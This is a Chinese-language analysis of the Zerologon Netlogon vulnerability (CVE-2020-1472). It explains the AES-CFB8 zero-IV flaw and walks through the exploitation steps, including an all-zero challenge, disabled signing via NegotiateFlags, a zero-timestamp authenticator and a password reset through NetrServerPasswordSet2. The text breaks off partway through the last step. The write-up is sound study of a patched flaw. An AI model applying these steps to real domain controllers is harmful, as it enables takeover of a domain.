# Zerologon域提权漏洞

2020年08月12日，Windows 官方发布了 `**NetLogon` 特权提升漏洞**的风险通告，该漏洞编号为 `CVE-2020-1472`，其又称 ****Zerologon****，漏洞等级：严重，漏洞评分：10分。

Zerologon 利用了加密认证协议中的漏洞，该协议（下面再仔细介绍）用来向 DC 证明加入域的 computer 的真实性和身份。但是由于不正确使用 AES 操作模式，攻击者就可以伪造成任何计算机帐户的身份（甚至是 DC 本身的身份），并在域中为该帐户设置空密码。

**漏洞影响版本**：

- Windows Server 2008 R2 for x64-based Systems Service Pack 1
- Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
- Windows Server 2012
- Windows Server 2012 (Server Core installation)
- Windows Server 2012 R2
- Windows Server 2012 R2 (Server Core installation)
- Windows Server 2016
- Windows Server 2016 (Server Core installation)
- Windows Server 2019
- Windows Server 2019 (Server Core installation)
- Windows Server, version 1903 (Server Core installation)
- Windows Server, version 1909 (Server Core installation)
- Windows Server, version 2004 (Server Core installation)

# 漏洞细节

## Netlogon

**Netlogon 是 Windows Server 进程**，用于对域中的用户和其他服务进行身份验证。由于 Netlogon 是服务而不是应用程序，因此除非手动或由于运行时错误而停止，否则 Netlogon 会在后台连续运行。Netlogon 可以从命令行终端停止或重新启动。**其他机器与域控的 netlogon 通讯使用RPC协议MS-NRPC。**

MS-NRPC 指定了 Netlogon 远程协议，主要功能：

- 基于域的网络上的用户和计算机身份验证；
- 为早于 Windows 2000 备份域控制器的操作系统复制用户帐户数据库；
- 维护从域成员到域控制器，域的域控制器之间以及跨域的域控制器之间的域关系，并发现和管理这些关系。

我们在 MS-NRPC 的文档里面可以看到为了维护这些功能所提供的 RPC 函数。

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled.png)

机器用户访问这些 RPC 函数之前会利用本身的hash进行校验，这次的问题就出现在认证协议的校验上，当这个校验被 bypass ，用户可以随意调用一些危险的 RPC 函数，Zerologon 中利用的就是 `NetrServerPasswordSet2`（更新用户在 Active Directory 中的密码）。

认证过程：

1. Netlogon 会话由客户端发起，客户端和服务器（**域控机**）通过此会话相互交换随机8字节的 `[nonces](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b5e7d25a-40b2-41c8-9611-98f53358af66#gt_001c0e40-0980-417d-853c-f7cb34ba6d3b)`（称为 `client and server challenges`）。
    
    ![1.jpg](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/1.jpg)
    
    该过程所用到的数据结构 `[NetrServerReqChallenge](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32)`：
    
    ```c
    NTSTATUS NetrServerReqChallenge(
       [in, unique, string] LOGONSRV_HANDLE PrimaryName,
       [in, string] wchar_t* ComputerName,
       [in] PNETLOGON_CREDENTIAL ClientChallenge,
       [out] PNETLOGON_CREDENTIAL ServerChallenge
     );
    ```
    
    参数：
    
    - PrimaryName：接受该信息的服务端的名称，服务器名称可以是 NetBIOS 格式或 DNS 格式。
    - ComputerName：一个 Unicode 字符串，其中包含调用此方法的客户端计算机的 NetBIOS 名称。
    - ClientChallenge：一个指向 `NETLOGON_CREDENTIAL` 结构体的指针，该结构体包含着 `Client Challenge`
    - ServerChallenge：一个指向 `NETLOGON_CREDENTIAL` 结构体的指针，该结构体包含着 `Server Challenge`
    
    返回值：方法调用成功返回 0x00000000；失败则返回非零数
    
    Client 调用 `NetrServerReqChallenge` 函数向域控发送自己的 `client challenge`，客户端必须在 `PrimaryName` 参数处填写有效的域控制器名称，在 `ClientChallenge` 参数填入随机生成的 8 字节 `nonce`，当然这里客户端是不用填写 `ServerChallenge` 参数的
    
    域控收到 `client challenge` 后不是一定会发送自己的 `server challenge`，其会先执行两个验证步骤：
    
    1. 如果域控不支持特定的 `Netlogon RPC` 方法（这里具体什么特定的方法我也不是很理解，想仔细探究的话可以跟 **[Common Error Processing Rules](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/2d776bfc-e81f-4c8f-9da8-4c2920f65413)**），根据返回类型回复 `ERROR_NOT_SUPPORTED` 或 `STATUS_NOT_SUPPORTED`
    2. 如果这个 `Netlogon RPC` 请求中有 DNS name 或 NetBIOS name 或 server name，域控会在现在其所在域查询该 name，如果域中无该机器，会发送 `ERROR_INVALID_COMPUTERNAME` 或 `STATUS_INVALID_COMPUTER_NAME`。
    
    两层验证均通过后，域控将生成的8字节 `nonce` 存入 `ServerChallenge` 参数中返回。
    
    域控把 `server challenge` 与在 `ComputerName` 参数中的客户端名称、`ClientChallenge` 参数中的 `client challenge` 一起存入到一个 **`ChallengeTable`** 结构中
    
    这里注意区分概念，`client challenge` 和 `server challenge` 均为一个八字节的 `nonce`
    
2. 第二步 Client 和域控同时进行，通过使用密钥推导函数（`key derivation function`），将两个 `Challenge` 与共享密钥”混淆”从而分别得到得到一个 `session key` (SK)。**这个共享密钥 secret 是客户端账户密码的 hash 值。**
    
    ![1 (3).jpg](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/1_(3).jpg)
    
3. 客户端利用这个 `session key 1` 和 `client challenge` 计算得到一个客户端凭证，并将这个 `client credential` 发送给服务端。
    
    ![1 (4).jpg](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/1_(4).jpg)
    
    2和3过程所用到的数据结构 `[NetrServerAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9)`：
    
    ```c
    NTSTATUS NetrServerAuthenticate3(
       [in, unique, string] LOGONSRV_HANDLE PrimaryName,
       [in, string] wchar_t* AccountName,
       [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
       [in, string] wchar_t* ComputerName,
       [in] PNETLOGON_CREDENTIAL ClientCredential,
       [out] PNETLOGON_CREDENTIAL ServerCredential,
       [in, out] ULONG * NegotiateFlags,
       [out] ULONG * AccountRid
     );
    ```
    
    参数：
    
    - PrimaryName：这个和上面的定义一样
    - AccountName：账户名，准确的说是包含域控和客户端共享密钥的账户名
    - SecureChannelType：一个 `NETLOGON_SECURE_CHANNEL_TYPE` 值，表明此调用所建立的安全通道的类型。
    - ComputerName：这个和上面的定义一样
    - ClientCredential：一个指向 `NETLOGON_CREDENTIAL` 结构体的指针，该结构包含所提供的 `client credential`
    - ServerCredential：一个指向 `NETLOGON_CREDENTIAL` 结构体的指针，该结构包含返回的 `server credential`
    - **NegotiateFlags**：该参数用于客户端和域控协商所支持的功能。这个感觉不是很好解释，可以自己看微软对这个的定义：
        
        A pointer to a 32-bit set of bit flags in little-endian format that indicate features supported. As input, the flags are those requested by the client and are the same as [ClientCapabilities](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/fd1e9181-35a0-45d3-b39c-b7453dfc0af5). As output, they are the bit-wise AND of the client's requested capabilities and the server's [ServerCapabilities](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b8d168ac-ebb6-42f4-bfb2-7a84377f2cbc). **For more details, see section [3.1.4.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5805bc9f-e4c9-4c8a-b191-3c3a7de7eeed).**
        
        这个参数还是比较重要的，主要是看 ****[3.1.4.2 Netlogon Negotiable Options](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5805bc9f-e4c9-4c8a-b191-3c3a7de7eeed)** 这部分。
        
    - AccountRid：接收 `AccountName` 参数指定帐户RID的指针。
    
    返回值：调用成功返回 0x00000000；失败返回非零数
    
    Client 必须在已经调用 `NetrServerReqChallenge`，并且收到 `server challenge` 后，才能调用 `NetrServerAuthenticate3`，将生成的 `client credential` 填入 `ClientCredential` 参数中
    
4. 域控收到 `client credential`，还是会进行两个验证环节（同上），通过后检查  `SecureChannelType` 参数，接着域控会计算核对 `Netlogon` 选项，即 `NegotiateFlags` （逐位 AND 运算）（此处有很多细节，想了解的话可以去看微软文档）
    
    域控在自己本地使用之前存入到 **`ChallengeTable`** 的 `client challenge` 计算一个 `client credential from server`，将其与客户端传递来的 `client credential` 进行比较，如果对比失败则对话失败
    
    如果核对成功，域控计算一个 `server credential`（`Server credential = Encrypt( session key 2,server challenge )`），将其返回给客户端
    
    ![1 (5).jpg](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/1_(5).jpg)
    
5. Client 收到 `server credential`，也会进行核对校验，细节就不讲了，然后客户端会用前面收到的 `server challenge` 计算一个 `server credential from client`，将其与从域控拿到的  `server credential` 比较验证，如果对比失败则对话失败，成功则建立连接

协议过程中有很多地方没有写出来，还是建议去看微软的官方文档

## Core vulnerability: insecure use of AES-CFB8

客户端和域控生成 `credential`，都是通过 `ComputeNetlogonCredential` 函数实现的

此函数接受一个**8字节的输入**，并使用 `**session key**` （就是上述第二步客户端和域控生成利用 `server challenge` 、`client challenge`、`secret`）作为密钥对输入进行转换，从而生成一个长度相等的输出。

该函数有两个版本：一个基于 2DES，另一个基于 AES。使用哪个取决于客户端在身份验证期间设置的标志，即取决于 **`NegotiateFlags`**

但是，现代版本 Windows Server 的默认配置是拒绝使用 2DES 方案进行身份验证的。在大多数领域中，只能使用AES方案。

正是由于使用了 AES 所以才到导致了 ****Zerologon****。虽然 2DE S由于其他原因仍被认为是不安全的，但却不受到 Zerologon 攻击的影响。

基本的 AES 分组密码操作接受16个字节的输入，并将其置换为同等大小的输出。**为了加密较大或较小的输入，必须选择操作模式。**`ComputeNetlogonCredential` 函数只需要转换8个字节，它使用了相当模糊的 **CFB8**（8位密码反馈）模式。这种模式比 AES 使用的任何更常见的操作模式慢大约16倍。

来看下 **AES-CFB8** 的加密过程（黄色部分为IV，蓝色部分为明文，红色部分为加密后密文，三部分以及AES加密密钥均为随机假设）：

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%201.png)

- AES-CFB8 会在明文前加上一段16字节的 `Initialisation Vector`（后面简称 IV，初始化向量）
- 对**IV+明文**的前16个字节进行 AES 加密，对加密结果只保留第一个字节，上图第二步，第一个字节为e2
- 将 e2 XOR 01得到 e3，上图第三步
- 再次对**IV+明文**的前16个字节进行 AES 加密，注意这里IV+明文的前16个字已经发生变化了，如第四步，继续取结果的第一个字节9a
- 9a XOR 02得到98，第五步
- 循环执行，直至明文全部加密完成

为了能够加密消息的初始字节，必须指定初始化向量（IV）来引导加密过程。IV值必须是唯一的，并且对于使用相同密钥加密的每个单独的明文，IV都应是随机生成的。但是，`**ComputeNetlogonCredential` 函数定义此IV是固定的，并且应始终由16个零字节组成。**很显然这造成使用 `ComputeNetlogonCredential` ****进行 AES-CFB8 并不安全。

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%202.png)

使用 `ComputeNetlogonCredential` 后新的运算就变成：

| 轮数 | 明文内容 | 参与AES运算的明文 | E(参与AES运算的明文) | XOR后的密文 |
| --- | --- | --- | --- | --- |
| 1 | 01 | 00000000000000000000000000000000 | a5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | 01 XOR a5 = a4 |
| 2 | 02 | 000000000000000000000000000000a4 | 8bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | 02 XOR 8b = 89 |
| 03 | 04 | 0000000000000000000000000000a489 | 11xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | 03 XOR 11 = 12 |

以此类推（虽然没有图理解起来这么容易，不过就将就看下）

这个举例明文还是用01 02 03 04 05 06 07 08，因为进行AES加密密钥不知道嘛，所以加密后的结果就随便编了

可以看到参与 AES 运算的明文就是不断删掉最前面的00，并在最后不断加入上一轮得到的密文

对于 AES 加密来说，key 值固定，那么得到的 E(X) 一定是固定的，这个毋庸置疑。我们就可以理解成，在 key 不变的情况下，如果保证所有轮数 **参与AES运算的明文** 是固定的，那么所有轮数 **E(参与AES运算的明文)** 一定是固定的。

看 **参与AES运算的明文** 的变化：

```
00000000000000000000000000000000-> 000000000000000000000000000000a4-> 0000000000000000000000000000a489
```

前面的00不断减少，后面不断加进密文，我们只需要保证从第一轮开始，每一轮加进来的密文为00，**参与AES运算的明文**就一直是00000000000000000000000000000000。也就是说现在只要保证每一轮 **加密后的密文** 是00，那么整个表格就不会变化。最后得到的密文就是0000000000000000。

要保证每一轮 **加密后的密文** 是00，只需要每一轮的 **明文** 和 **E(参与AES运算的明文)**  的前面8位一样就行。(两个一样的的数异或为0)

| 轮数 | 明文内容 | 参与AES运算的明文 | E(参与AES运算的明文) | XOR后的密文 |
| --- | --- | --- | --- | --- |
| 1 | XY | 00000000000000000000000000000000 | XYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | XY XOR XY = 00 |
| 2 | XY | 00000000000000000000000000000000 | XYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | XY XOR XY = 00 |
| 03 | XY | 00000000000000000000000000000000 | XYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | XY XOR XY = 00 |

由于在 key 固定的情况下，E(00000000000000000000000000000000) 的值固定，所以 **E(参与AES运算的明文)** 的前面8位是固定的，而每一轮的 **明文** 和  **E(参与AES运算的明文)** 的前面8位一样，这就要求每一轮的明文内容就必须要一样。所以要求明文的格式就是`XYXYXYXYXYXYXY`这种格式。

最后一个难点，我们是可以控制明文的，但是不知道 AES 加密密钥，怎么保证 **E(00000000000000000000000000000000)** 的前面8位一定和明文一样呢。

当然这是不能保证的，但是前面8位的可能性有 2^8=256 种(即`000000000-11111111`，`00-FF`)，因为每一位都可能是0或者1，说明我们在不知道密钥（`session key`）的情况下，E(00000000000000000000000000000000) 的前8位有1/256的概率与明文一样。

在AES_CFB8算法中，如果IV为全零。只要我们能控制明文内容为XYXYXYXY这种格式(X和Y可以一样，既每个字节的值都是一样的)，那么一定存在一个key,使得 `AES_CFB8(XYXYXYXY)=00000000`。

该漏洞exp利用的明文为00000000，也就是 `client challenge` 全0，下面将利用过程时也按照 `client challenge` 为全0讲。在不知道 `session key`(SK)情况下， 也可以在1/256的时间内得到正确的计算结果，因为始终是在对0进行加密。如下图：

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%203.png)

- 首先假设全零IV和明文
- 第二步，给出一个AES随机密钥，对于全零块的AES加密，使结果恰好以0开头的概率为1/256
- 0 XOR 0还是0
- 由此可见下一轮进行AES加密的前16字节仍全为0，那么加密结果就和之前一样了
- 如此循环，将会得到一个全0密文

# 漏洞利用

## Exploit step 1：伪造client challenge

学习了认证过程这部分，我们知道验证身份最关键的步骤就是域控会计算一个 `client credential from server` 与 Client 发送来的 `client credential` 进行比对，同时识别身份。

想象一下，如果我们发送给域控的 `client credential` 为00000000，域控在比对时自己生成的 `client credential` 也为00000000，那么比对不就通过了嘛，我们可以作为域中的任何计算机与域控建立连接，甚至是作为域控机。

不过想让域控生成的 `client credential` 为00000000，肯定不可能一次就成功地，因为域控上 AES 加密密钥也是就是 `session key` 由 secret、client challenge、server challenge 三部分生成，`client challenge` 是我们可控的，为00000000，不过 `server challenge` 在每次发出 `client and server challenges` 时都会不同。

这就导致了一种情况，我们循环向域控发出请求后，域控每次会生成一个不同的 `session key`，总会出现一个 `session key` 会使得域控生成的 `client credential` 为00000000。当出现这样的 `session key` 时，域控对比相同，就会同意我们与其建立通道连接，进而后续利用。

最重要的是，就算进行了多次无效的连接尝试，我们也不会被 ban 掉。

## Exploit step 2：禁用签名和密封

还有一个问题，就是由于 Netlogon 的传输加密机制，认证的整个协议包里面，默认会增加**签名校验**，这个签名的值由 `session key` 进行加密的。第一步虽然我们通过了身份验证，但是仍然不知道 `session key` 是多少。

 解决这个问题办法就是设置 `NegotiateFlags` 这个参数，还记得它吗，就是在 `NetrServerAuthenticate3` 函数中。前面介绍 `NegotiateFlags` 时建议看 [3.1.4.2 Netlogon Negotiable Options](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5805bc9f-e4c9-4c8a-b191-3c3a7de7eeed)，这里就要用了。

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%204.png)

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%205.png)

该参数是一个32-bit的 flag，它的第二位是设置是否开启 `Secure RPC`，如果填0，即可禁用签名校验，所以在Poc里面作者将 flag 位设置为0x212fffff（0**0**100001001011111111111111111111）

ps：当服务器没有设置启用签名校验，但是客户端发请求时设置了启用，客户端就会拒绝连接。反之，如果客户端没有设置为1，而服务端设置为1的话，服务端是不会拒绝这个请求不加密的客户端的连接的。我们在这次攻击中充当的是客户端，所以只要设置成0就可继续利用了。

## Exploit step 3：伪造调用函数

其实实现了第一二步后，我们的客户端就算绕过认证跟域控建立连接了，可以调用RPC函数了。

But 即使我们禁用了上面的加密过程，在 Client 所能调用的很多函数中仍然需要一个所谓的验证值，该值被记录在函数的 `**Authenticator**` 参数中。在前面的校验通过，建立通道之后，域控还会校验 `Authenticator`。

这里以 Zerologon 利用的 **[NetrServerPasswordSet2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)** 函数举例：

```c
NTSTATUS NetrServerPasswordSet2(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* AccountName,
   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_AUTHENTICATOR Authenticator,
   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
   [in] PNL_TRUST_PASSWORD ClearNewPassword
 );
```

来看官方对 `Authenticator` 的定义：

> **Authenticator:** A pointer to a [NETLOGON_AUTHENTICATOR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab) structure, as specified in section 2.2.1.1.5, that contains the encrypted logon [credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b5e7d25a-40b2-41c8-9611-98f53358af66#gt_b505ab37-868d-426c-bb19-af21e675e0b8)  and a time stamp.
> 

简单来说，他就是一个指向 NETLOGON_AUTHENTICATOR 结构体的指针：

```c
typedef struct _NETLOGON_AUTHENTICATOR {
   NETLOGON_CREDENTIAL Credential;
   DWORD Timestamp;
 } NETLOGON_AUTHENTICATOR,
  *PNETLOGON_AUTHENTICATOR;
```

> **Credential:** A **NETLOGON_CREDENTIAL** (section [2.2.1.3.4](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd)) structure that contains the encrypted portion of the [authenticator](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b5e7d25a-40b2-41c8-9611-98f53358af66#gt_e72a2c02-84a2-4ce3-b66f-86f725642dc3).
> 
> 
> **Timestamp:** An integer value that contains the time of day at which the client constructed this authentication credential, represented as the number of elapsed seconds since 00:00:00 of January 1, 1970. The authenticator is constructed just before making a call to a method that requires its usage.
> 

先说这个时间戳吧，其定义是一个整数值，包含客户端构建此身份验证凭据的时间，表示为自1970年1月1日00:00:00起经过的秒数。

再是 `Credential`，他是个结构体，不过其中只有一个成员，char 类型、大小为8的数组，他是双方进行验证的主力军。

微软官方给出了在调用 RPC 函数时[如何计算验证值](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/da7acaa3-030b-481e-979b-f58f89389806)

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%206.png)

1. 客户端在发送请求时会进行两步操作（`ClientAuthenticator` 就是一个 `NETLOGON_AUTHENTICATOR` 结构体）：
    1. 填写 `ClientAuthenticator.Timestamp` 以记录当前时间
    2. 将这个时间戳值与 `ClientStoredCredential` 相加，使用 `session key` 作为 AES-CFB8 的加密密钥对新 `ClientStoredCredential` 加密，将结果保存到 `ClientAuthenticator.Credential`
    3. 将 `ClientAuthenticator` 发送至服务端
    
    ```
    SET TimeNow = current time;
    SET ClientAuthenticator.Timestamp = TimeNow; 
    SET ClientStoredCredential = ClientStoredCredential + TimeNow;
    CALL ComputeNetlogonCredential(ClientStoredCredential,
                   Session-Key, ClientAuthenticator.Credential);
    ```
    
    可能你会对 `ClientStoredCredential` 感觉很懵，其实它很早就出现了，它的初始化是在客户端调用 `NetrServerAuthenticate3` 前发生的。[3.4.5.2.2 Calling NetrServerAuthenticate3](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nrpc/5ce4f403-c16e-42bc-9c6e-30d7e319feac)
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%207.png)
    
2. 服务器接收到请求时（`ServerAuthenticator` 同 `ClientAuthenticator`）
    1. 首先服务端会去确认 `ClientAuthenticator.Credential` 的有效性。将收到的时间戳即 `ClientAuthenticator.Timestamp` 与本地 `ServerStoredCredential` 相加，使用 `session key` 作为 AES-CFB8 的加密密钥对新 `ServerStoredCredential` 加密，将这个解密结果与收到的 `ClientAuthenticator.Credential` 进行比较
        1. 如果 Netlogon 凭据不匹配，则操作将失败，并向客户端返回拒绝访问；
        2. 如果匹配，服务端将 `ServerStoredCredential` 加1，将其进行 AES 加密后，作为新的 Netlogon 凭据即 `ServerAuthenticator` 存储
    2. 然后将 `ServerAuthenticator` 发给客户端
    
    ```
    SET ServerStoredCredential = ServerStoredCredential +
                   ClientAuthenticator.Timestamp;
    CALL ComputeNetlogonCredential(ServerStoredCredential,
                   Session-Key, TempCredential);
    IF TempCredential != ClientAuthenticator.Credential
        THEN return access denied error
      
    SET ServerStoredCredential = ServerStoredCredential + 1;
    CALL ComputeNetlogonCredential(ServerStoredCredential,
                   Session-Key, ServerAuthenticator.Credential);
    ```
    
    `ServerAuthenticator` 也是在客户端调用 `NetrServerAuthenticate3` 服务端收到该消息时第一次出现的，如果自己去看过[3.5.4.4.2 NetrServerAuthenticate3](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9)应该就会有印象
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%208.png)
    
    他被初始化为客户端的 `client credential`
    
3. 客户端收到服务端的返回：
    
    同样 Client 也要验证 `ServerAuthenticator`。将 `ClientStoredCredential` 递增加一，，使用 `session key` 作为 AES-CFB8 的加密密钥对 `ClientStoredCredential` 加密，比较加密结果与服务端返回的 `ServerAuthenticator.Credential`
    
    1. 如果相同，客户端会将其存储为新的 `ClientAuthenticator`;
    2. 如果验证失败，客户端会认为应该与域控重新建立安全通道。
    
    ```
    SET ClientStoredCredential = ClientStoredCredential + 1;
     CALL ComputeNetlogonCredential(ClientStoredCredential,
                   Session-Key, TempCredential);
     IF TempCredential != ServerAuthenticator.Credential
        THEN return abort
    ```
    

下面我们来说明如何绕过域控对 `Authenticator` 的校验，当然这是基于我们完成了前面两步哈

还是以调用  `NetrServerPasswordSet2` ****函数举例，我们把两个地方发生的操作单独拿出：

```
Client:
SET TimeNow = cur rent time;
SET Authenticator.Timestamp = TimeNow; 
SET ClientStoredCredential = ClientStoredCredential + TimeNow;
CALL ComputeNetlogonCredential(ClientStoredCredential,
               Session-Key, Authenticator.Credential);

Server:
SET ServerStoredCredential = ServerStoredCredential +
               Authenticator.Timestamp;
CALL ComputeNetlogonCredential(ServerStoredCredential,
               Session-Key, TempCredential);
IF TempCredential != Authenticator.Credential
    THEN return access denied error
```

甚至我们可以把上面整理简化为：

```
Authenticator.Credential = AES-CFB8( ServerStoredCredential + current time )
```

问题就成了在域控中如何使该等式成立了

首先可以确定的是 `ServerStoredCredential` 为00000000，因为在第一步时我们传给域控的 `client credential` 就等于00000000。

这样等式右边变为 `AES-CFB8( client credential + current time )`

在我们第一步完成的情况下，此时用于 AES 加密密钥的 `session key` 会使00000000加密结果依旧为00000000

那么如果 `Authenticator.Credential` 为00000000，再让 `client credential + current time` 为 00000000，那么等式不就成立了！！！

- `Authenticator.Credential` 是由我们发出的，当然可以控制为00000000；
- `current time` 也就是 `Authenticator.Timestamp`，是自1970年1月1日00:00:00起经过的秒数，这个参数还是我们可控的，假设我们把自己的时间设置为1970年1月1日00:00:00，那么 `Authenticator.Timestamp` 就为0了。

OK完成域控对 `Authenticator` 的校验。

## Exploit step 4：篡改一台computer在AD中的密码

经过前面几步，我们与域控构建了通道，为什么一上来就是修改密码，而不是获取存在于AD中的密码呢？

因为虽然我们能够调用 `NetrServerPasswordGet` 函数并得到返回结果，但是这个返回结果是利用 `session key` 加密后的结果，`session key` 我们不得而知，也就无法解密

![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%209.png)

Zerologon 利用 ****`[NetrServerPasswordSet2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)`** 函数修改密码

```c
NTSTATUS NetrServerPasswordSet2(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* AccountName,
   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_AUTHENTICATOR Authenticator,
   [out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
   [in] PNL_TRUST_PASSWORD ClearNewPassword
 );
```

这次重点看 `ClearNewPassword`：

> A pointer to an [NL_TRUST_PASSWORD](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/52d5bd86-5caf-47aa-aae4-cadf7339ec83) structure, as specified in section 2.2.1.3.7, that contains the new password encrypted as specified in [Calling NetrServerPasswordSet2 (section 3.4.5.2.5)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b348c16e-5cdb-4414-876d-e8b0e12fbae0).
> 

先了解这个结构体是什么样的：

```c
typedef struct _NL_TRUST_PASSWORD {
   WCHAR Buffer[256];
   ULONG Length;
 } NL_TRUST_PASSWORD,
  *PNL_TRUST_PASSWORD;
```

微软官方介绍：

> NL_TRUST_PASSWORD 结构定义了一个缓冲区，用于承载要通过网络传输的计算机帐户密码或信任密码。它作为 NetrServerPasswordSet2 方法的输入参数传输。域成员使用 NetrServerPasswordSet2 更改其计算机帐户密码。主域控制器使用 NetrServerPasswordSet2 更改所有受信任域的信任密码。**NL_TRUST_PASSWORD 结构在通过网络发送之前使用协商的加密算法进行加密。**
> 

参数：

- Buffer：Unicode字符数组，大小为512字节，将其视为包含密码的字节缓冲区。
    - 不同目的下填入 Buffer 中数据的格式是不同的。因为漏洞是修改计算机账户密码，所以这里只介绍填入一个 computer account password时，Buffer 的格式（其他格式在其微软文档中有介绍）：
        
        ![image004.png](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/image004.png)
        
        - 第一个（512–密码长度）字节必须是随机生成的数据；
        - 缓冲区的最后一个长度字节包含明文密码。
- Length：密码的长度，以字节为单位。

下面来看调用 `NetrServerPasswordSet2` 的话客户端和域控会有什么操作

1. Client-[3.4.5.2.5 Calling NetrServerPasswordSet2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/b348c16e-5cdb-4414-876d-e8b0e12fbae0)
    
    ![Untitled](Zerologon%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%2051e6b1deec904700ab4e89dcc473305c/Untitled%2010.png)
    
    1. 客户端会使用之前与域控协商的加密算法，这里也就是 AES-CFB8 ，对 `ClearNewPassword` 该参数进行加密，密钥为 `session key`
    2. 然后就是传递有效的 `Authenticator`，这个我们在第三步就已实现 bypass
    
    `ClearNewPassword` 会被进行如下构造，假设 WCHAR 类型的密码长度为 X 字节。
    
    - 密码会被复制到 `ClearNewPassword` 的 `Buffer` 字段中，`Buffer` 是一个 WCHAR 数组，password 会被放在数组的从 512-X 到末尾的地方
    - `ClearNewPassword.Buffer` 前面 512-X 个字节空间会被随机生成的数据填充
    - `ClearNewPassword.Length` 设置为 X
2. 域控收到修改请求
    1. 首先对 `Authenticator`、`PrimaryName` 进行验证
    2. 然后如果服务器设置了 `RefusePasswordChange`，并且 `SecureChannelType` 为 WorkstationSecureChannel，则服务器必须返回 STATUS_WRONG_PASSWORD。
        
        > **RefusePasswordChange:** Indicates whether the server refuses client password changes. This domain-wide setting indicates to client machines to avoid password changes. When TRUE, the *NegotiateFlags* bit I is sent.
        > 
        
        它是用来表示服务器是否拒绝客户端密码更改。当为 TRUE 时，*NegotiateFlags* 的 I 位设为1
        
